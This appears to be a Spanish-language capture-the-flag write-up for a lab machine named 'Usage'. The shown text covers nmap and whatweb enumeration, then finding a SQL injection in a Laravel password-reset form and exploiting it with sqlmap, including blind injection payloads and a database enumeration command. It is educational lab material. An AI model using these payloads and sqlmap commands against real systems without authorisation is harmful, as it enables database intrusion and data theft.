<p align="center">
    <img src="imagenes/Usage.png" alt="Usage" width="400"  />
</p>
<br>

# Habilidades principales utilizadas
- Injección SQL.
- Descifrado de hashes.
- Abuso de subida de archivos.
- Abuso de privilegios de sudo.
<br>

# Enumeración
Iniciamos nuestra fase de enumeración realizando un ping a la máquina. Por el TTL devuelto, podemos intuir tiene un sistema operativo basado en Linux.

```bash
# ping -c 1 10.10.11.18                                                                                                         
PING 10.10.11.18 (10.10.11.18) 56(84) bytes of data.
64 bytes from 10.10.11.18: icmp_seq=1 ttl=63 time=49.1 ms

--- 10.10.11.18 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 49.110/49.110/49.110/0.000 ms
```
Ejecutamos la utilidad NMAP para descubrir los servicios y su versión que la máquina auditada tiene expuestos.
```bash
Nmap scan report for 10.10.11.18
Host is up, received user-set (0.043s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Vemos que la petición web a la dirección http://10.10.11.18 intenta hacer una redirección hacia http://usage.htb. Para que nuestra máquina de atacante pueda resolverla, añadimos la entrada en nuestro fichero /etc/hosts.
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.18 usage.htb                
```
Procedemos a realizar una enumeración de las tecnologías empleadas por la web. Entre otras tecnologías, el uso de Laravel parece la más relevante.
```bash
# whatweb http://usage.htb 
http://usage.htb [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
<br>

> [!NOTE]
> Laravel es un framework de código abierto para desarrollar aplicaciones y servicios web con PHP. Su filosofía es desarrollar código PHP de forma elegante y simple, evitando el "código espagueti".

<br>

Abrimos la página web con nuestro navegador. Vemos que hay un enlace hacia http://admin.usage.htb, el cual intuimos que puede ser un portal de administración.
<p align="left">
    <img src="imagenes/usage_1.png" alt="usage_1" width="500"  />
</p>

Volvemos a modificar nuestro fichero /etc/hosts para contemplar este nuevo FQDN.
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.18 usage.htb admin.usage.htb
```

Antes de saltar a revisar el panel de administración, seguimos enumerando la web principal. Vemos hay un enlace que lleva a http://usage.htb/forget-password. Esta web, parece que habilita al usuario la posibilidad de resetear su propia contraseña, enviando un correo electrónico a la cuenta de correo que el usuario tiene asociada. intentamos realizar una injección de SQL simple, añadiendo una ' al campo de correo electrónico. Vemos que la web muestra un error 500 como respuesta a la petición enviada.
<p align="left">
    <img src="imagenes/usage_2.png" alt="usage_2" width="500"  />
</p>
<p align="left">
    <img src="imagenes/usage_3.png" alt="usage_3" width="500"  />
</p>

<br>

# Análisis de vulnerabilidades

Repetimos la operación, pero esta vez capturamos la petición mediante Burpsuite.
<p align="left">
    <img src="imagenes/usage_4.png" alt="usage_4" width="500"  />
</p>

Almacenamos el contenido de la petición en un fichero llamado request.txt. Posteriormente le pasaremos el fichero de la petición a SQLMap para intentar explotar la vulnerabilidad de Injección de SQL. Añadimos la opción -p para indicar el campo que queremos que intente la injección.
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch
<omitido>
sqlmap identified the following injection point(s) with a total of 740 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8583=(SELECT (CASE WHEN (8583=8583) THEN 8583 ELSE (SELECT 7061 UNION SELECT 4296) END))-- NGWH

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8195=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- eqGh
---
[09:57:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
<omitido>
```
Ahora, enumeramos las bases de datos del servicio MYSQL. 
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --dbs
```



